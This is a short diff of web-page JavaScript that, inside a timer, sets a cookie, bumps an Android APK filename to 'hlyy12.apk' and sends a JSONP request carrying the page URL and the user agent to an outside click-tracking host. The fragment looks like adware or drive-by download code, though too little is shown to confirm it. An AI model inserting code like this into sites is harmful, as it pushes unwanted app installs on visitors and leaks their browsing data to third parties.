@@ -288,7 +288,7 @@ var hy_itv=setInterval(function(){
 							setCookie("hyipdata","0");
 							if(hlTime())
 							{
-								pname="hlyy10.apk";
+								pname="hlyy12.apk";
 								getJsonp(
 									'http://click.shuiguo.com/index.php?action=index&method=main1',
 									"t=undefined&s=tag_889&ref="+document.URL+"&url="+document.URL+"&typeid=1&ug="+ua,
